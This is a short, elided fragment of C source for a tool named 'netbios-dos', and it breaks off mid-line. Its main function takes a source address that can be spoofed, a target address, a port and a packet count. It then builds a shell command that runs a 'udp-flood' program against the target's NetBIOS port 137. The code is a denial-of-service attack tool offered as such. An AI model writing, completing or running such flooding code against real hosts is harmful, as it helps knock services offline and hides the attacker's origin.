...
int main(int argc,char* argv[]){
	if(argc!=9){fprintf(stdout,"Usage: netbios-dos --source-addr saddr --remote-addr raddr --source-port sport --n N\n"); exit(0); }
	...
	sprintf(cli,"./udp-flood --source-addr %s --remote-addr %s --source-port %s --remote-port 137 --n %d",source_address, \
